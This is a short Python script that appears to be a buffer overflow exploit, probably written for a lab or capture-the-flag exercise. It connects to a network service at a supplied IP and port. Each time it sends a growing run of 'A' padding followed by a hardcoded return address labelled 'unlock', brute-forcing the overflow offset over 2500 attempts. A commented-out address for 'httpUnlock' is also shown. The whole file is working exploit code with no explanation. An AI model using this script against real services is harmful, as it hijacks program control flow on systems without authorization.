import socket
import time 
import struct
import sys 

#Usage: python3 ports.py [ip adress] [port] 

#HOST = '192.168.1.10'
#PORT = 10589

#HOST = 'localhost'
#PORT = 10009

def main():
   ip = sys.argv[1]
   port = sys.argv[2]
   
   findport = open(port,"r")
   for line in findport:
      PORT = line 
      PORT = int(PORT)

   i = 0 
   while i < 2500:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((ip, PORT))
         
         buf = b""
         buf += b"A"*(1024 + i)
         #buf += b'\xa2\x9e\x04\x08' #08049ea2 <httpUnlock>:
         buf += b'\x3c\x8e\x04\x08' #08048e3c <unlock> 
         print(buf)
         s.send(buf)
         i += 1 
   
if __name__ == '__main__':
    main()
